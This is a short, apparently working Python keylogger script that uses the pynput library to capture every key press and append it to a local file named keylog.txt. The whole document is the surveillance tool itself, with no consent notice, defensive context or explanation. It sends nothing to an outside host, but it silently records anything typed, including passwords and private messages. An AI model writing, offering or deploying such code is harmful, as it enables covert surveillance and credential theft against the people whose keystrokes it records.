from pynput.keyboard import Key, Listener


def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))
        if key == Key.enter:
            f.write("\n")
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
